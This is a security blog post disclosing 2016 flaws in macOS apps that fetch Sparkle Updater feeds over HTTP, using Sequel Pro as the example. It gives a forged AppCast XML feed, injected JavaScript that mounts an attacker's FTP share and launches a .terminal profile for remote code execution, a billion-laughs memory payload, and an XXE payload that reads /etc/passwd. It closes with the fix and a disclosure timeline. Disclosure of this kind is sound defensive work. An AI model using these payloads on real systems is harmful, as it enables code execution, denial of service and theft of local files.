# There's a lot of vulnerable OS X applications out there.

[Original URL](https://vulnsec.com/2016/osx-apps-vulnerabilities/)

> Lately, I was doing research connected with different updating strategies, and I tested a few applications working under Mac OS X. This short weekend research revealed that we have many insecure...

Lately, I was doing research connected with different updating strategies, and I tested a few applications working under Mac OS X. This short weekend research revealed that we have many insecure applications in the wild. As a result, I have found a vulnerability which allows an attacker take control of another computer on the same network (via MITM).

I've tested on both OS X 10.10 (Yosemite) and 10.11 (El Capitan) with the latest version of the software, though it should work with previous versions too.

The vulnerability is **not** in code signing itself. It exists due to the functionality provided by the WebKit view that allows JavaScript execution and the ability to modify unencrypted HTTP traffic (XML response).

**UPDATE 30/01/2016**

We have **two different** vulnerabilities here. First one is connected with the default configuration (`http`) which is unsafe and leads to RCE over MITM attack inside untrusted environment.

The second one is the risk of parsing `file://`, `ftp://` and other protocols inside the WebView component. As a result, if there is a security flaw on the server that allows replacing XML file, it can target all people through the affected application. It's possible even without knowing the private DSA key, without modifying application binary on the server and over `https`. After that, it doesn't require the MITM attack anymore.

**The newest version of the Sparkle Updater is already available, and it addresses described vulnerabilities.**

## Which applications are affected?

In short, all applications that use the [Sparkle Updater](http://sparkle-project.org/) framework and are connecting over HTTP instead of a secure HTTPS connection are vulnerable. Since Sparkle throws an error in case of an invalid SSL certificate by default, it helps to protect against MITM attacks when used wisely.

List of all applications using Sparkle Updater framework is huge since it is the most widely used updating framework available for OS X developers.

Example applications using Sparkle Updater:

- [Adium](https://adium.im/)
- [Coda](https://panic.com/coda/)
- [iTerm](https://www.iterm2.com/)
- [Facebook Origami](https://facebook.github.io/origami/update/)
- [SequelPro](http://www.sequelpro.com/)
- [Tunnelblick](https://tunnelblick.net)
- [VLC](http://www.videolan.org/vlc/)

There are [more](https://github.com/sparkle-project/Sparkle/issues/717), but not all of them are vulnerable.

## Sparkle Updater

The Sparkle Updater framework in its nature is safe and easy to use. Developers who include Sparkle in their projects just broke one simple rule: they did not set HTTPS everywhere.

The Sparkle Updater [documentation](http://sparkle-project.org/documentation/#publish-your-appcast) notes:

> "We strongly encourage you to use HTTPS URLs for the AppCast."

Since downloading an application binary over HTTPS and using DSA signature for validation is quite common and most of the applications do that, there is still a tricky part called AppCast.

AppCast is the RSS feed that hosts information about our software updates, available versions and release notes. It's the first URL that an application asks for when its update process starts. But what if the AppCast URL is using an unencrypted HTTP protocol?

## AppCast

We cannot modify a binary on the fly without the key required for signing an application package. That is why using tools like BDFProxy is not going to work here because by changing a binary or replacing it with a different one you are going to break the DSA Signature validation process; Sparkle Updater returns an error.

If we cannot modify the binary file and we cannot update the DSA signature, does it sound like an impossible mission? Not really. Let's take a look at this AppCast feature.

Every time you want to release a new version of an application you need to publish changes to your AppCast, just like with an RSS channel.

The official documentation of the Sparkle Updater project [describes details of this process](http://sparkle-project.org/documentation/publishing/#publishing-an-update).

![](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/schema.1.png)

The AppCast request and response is using XML for the data exchange. The update notification message is just pure HTML code displayed inside a WebView component. In short it means that we have access to HTML and JavaScript which is enough to do some harm to the end user.

The `description` entity holds the entire update message to the user.

```
<item>
 <title>Version 2.0 (2 bugs fixed; 3 new features)</title>
 <description><![CDATA[
 <h2>New Features</h2>
 ...
 ]]>
 </description>
 ...
</item>
```

## MITM Attack

Man In The Middle ([MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)) is an attack where the third party secretly intercepts traffic between two parties, _e.g._, a user and a server. It provides an opportunity to capture and modify (un)encrypted traffic from the user.

Let's sum up everything to that point:

- AppCast process is using HTTP that could be intercepted and modified on the fly
- We can insert our HTML and JavaScript code into a WebView component to display it to the user
- We control the transmission after doing the MITM attack

With all this information, we can go further and start our attack against [SequelPro](http://www.sequelpro.com/) (chosen at random). Let's visualize the actual network topology:

![](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/schema.2.png)

After we control unencrypted traffic from the Bob machine by setting up one of the attacks inside your LAN, like fake Wi-Fi Access Point or sniffing/spoofing, this part is ready. Now we can spoof DNS probes for the AppCast server and send our malformed response which is:

```
<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:atom="http://www.w3.org/2005/Atom"
xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" version="2.0">
 <channel>
 <title>Sequel Pro</title>
 <link>http://www.sequelpro.com/</link>
 <description>Appcast for Sequel Pro</description>
 <language>en</language>
 <item>
 <title>Sequel Pro v1.2</title>
 <description><![CDATA[
 <h1>Modified message</h1>
 <p>It means that our <b>MITM</b> attack is working.</p>
 ]]></description>
 <pubDate>Thu, 01 Jan 1970 00:00:01 GMT</pubDate>
 <enclosure
 url="https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg"
 length="10482573"
 type="application/octet-stream"
 sparkle:dsaSignature="MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY=="
 sparkle:version="9999" sparkle:shortVersionString="9.99" />
 </item>
 </channel>
</rss>
```

Remember to bump-up an app version (`sparkle:version`) in the XML response. Without it, SequelPro is not going to display our update reminder.

![SequelPro update reminder](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.1.png)

After we've confirmed that `HTML` code get executed, we can test for a `JavaScript` example:

```
<description><![CDATA[
 <script type="text/javascript">
 window.location = 'https://www.google.com/';
 </script>
]]></description>
```

After checking for an update inside SequelPro app, Google website appears in our web browser, which means that the built-in WebView component executes JavaScript code.

To sum up:

- We have a running MITM attack
- We control JavaScript code executed on the client side (we can just open the user's browser and redirect them to a malicious website with 0day checks)

However, what if a malicious site is not capable of finding an exploit for the specific browser? It is not exploitable then by just redirecting the user to a malicious website. Let's abuse the WebView component.

## Abusing Webkit, WebView component

This part is tricky. I tested many different solutions to exploit this WebView component, and failed many times. Matt just gave me a hint in his article [_XSS to RCE in Atlassian Hipchat_](http://maustin.net/hipchat_rce/). It was the missing piece of the puzzle -- executing the external application right from the WebView component.

Before we exploit this issue we need to:

- Set up an FTP server (our-fake-server.com) to host our malicious code
- Run the HTTP server to act as an AppCast server
- Redirect user traffic from the www.sequelpro.com original IP address to our fake HTTP server

When we are ready, we just need to replace our previous JavaScript snippet with modified code:

```
<description><![CDATA[
<h1 style="color: red;">Remote Code Execution</h1>
<script type="text/javascript">
 window.location = 'ftp://anonymous:[email protected]/';
 window.setTimeout(function() {
 window.location = 'file:///Volumes/our-fake-server.com/UPGRADE.terminal';
 }, 1000);
</script>
]]></description>
```

Our `UPGRADE.terminal` file is an exported setting profile from the Terminal app (Terminal -> Preferences -> Profiles). Inside the "Shell" tab of selected profile, there is a possibility to add a startup command to execute immediately after loading a profile.

![Terminal -> Preferences -> Profiles](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.2.png)

After our `UPGRADE.terminal` file is ready we can set up everything needed and start our attack. Remember that the user does not need to check for an update manually because applications do those checks periodically; it means that you can just wait for an appropriate update request from the app and then exploit it.

This simple trick worked because:

- When you are opening an external resource like FTP, SMB or AFP, then OS X is mounting it automatically under `/Volumes/` path.
- We know the path to the resource because directory name is the same as the server name. As a result, we have the full path of `/Volumes/our-fake-server.com/`.
- We opened app with the `.terminal` extension as a script. OS X is not looking for a signature/certificate and is not validating an app downloaded from the internet. It basically skips [Gatekeeper](https://en.wikipedia.org/wiki/Gatekeeper_(OS_X)) validation.

This vulnerability results in the **Remote Code Execution**.

## Abusing XML format

There is also an additional attack that could be easily performed using the discovered vulnerability. Since communication is based on the `XML` format, we can test it against [XML External Entity (XXE) Processing](https://en.wikipedia.org/wiki/XML_external_entity_attack) attack as well as [Billion laughs](https://en.wikipedia.org/wiki/Billion_laughs) attack.

### Billion laughs

Furthermore, we can enforce application to allocate much memory resources.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

After running described attack using presented XML file, you can see that Sequel app is allocating **3GB** of memory. It means that our example worked well.

![SequelPRO allocating 3GB of memory](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.3.png)

### XXE

It is also possible to insert into the content of the update message any file located on the disk as far as SequelPRO can access it.

```
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [ 
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" version="2.0">
 <channel>
 <title>Sequel Pro</title>
 <link>http://www.sequelpro.com/</link>
 <description>Appcast for Sequel Pro</description>
 <language>en</language>
 <item>
 <title>Sequel Pro v1.2</title>
 <description>&xxe;</description>
 <pubDate>Thu, 01 Jan 1970 00:00:01 GMT</pubDate>
 <enclosure url="https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg" length="10482573" type="application/octet-stream" sparkle:dsaSignature="MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY==" sparkle:version="9999" sparkle:shortVersionString="9.99" />
 </item>
 </channel>
</rss>
```

![SequelPRO reading /etc/passwd file](https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.4.png)

### XXE Out-Of-Band Data Retrieval

The interesting thing about XXE vulnerability is that when `SYSTEM` entity is available, you could read files directly from the remote system. This entity is the simplest test for the XXE OOB attack.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/ping" > ]>
```

In that case, it is not working because there is an appropriate [fix](https://github.com/sparkle-project/Sparkle/blob/93a87a4dfd89fbb2fbfbda4b0835b7d04a31001d/Sparkle/SUAppcast.m#L105) implemented for Sparkle framework. Sparkle Updater is free against XXE OOB attack.

## Video

## Solution

If you are curious if applications that you are running on your computer are affected by implementing the Sparkle Updater without `https` prefix, just run Wireshark and check it.

To fix and avoid RCE in your app, you need to edit `Info.plist` file and replace `http` -> `https` for `SUFeedURL` key. Remember to check if your server configuration supports https and you have a valid SSL certificate in place.

To fully protect against this issue you need to upgrade the Sparkle Updater framework to the version `1.13.1` (<http://sparkle-project.org/>) which was already patched.

## Thoughts on reporting this bug

**Origami (Facebook)** - I was talking with Zac. They fixed it immediately on the same day. Great communication and great process. I am glad that responsible people are working there.

**Mitre CVE** - I requested the CVE but didn't get any response from them. It's been a few weeks already. They even ignored The Sparkle Updater maintainer.

**Sequel Pro** - We jumped into the conversation right away and talked about this issue. I'm glad that [Abhi](https://github.com/abhibeckert) is maintaining this project, cool guy with such an extensive knowledge of programming. P.S. Nice things are coming to future releases of Sequel Pro, wait for it.

**Sparkle Updater** - Passionates work on this project, first patch prepared on the same day. Excellent understanding of an issue. A big thanks to [Kornel](https://github.com/pornel).

**Please do "update" your applications.**
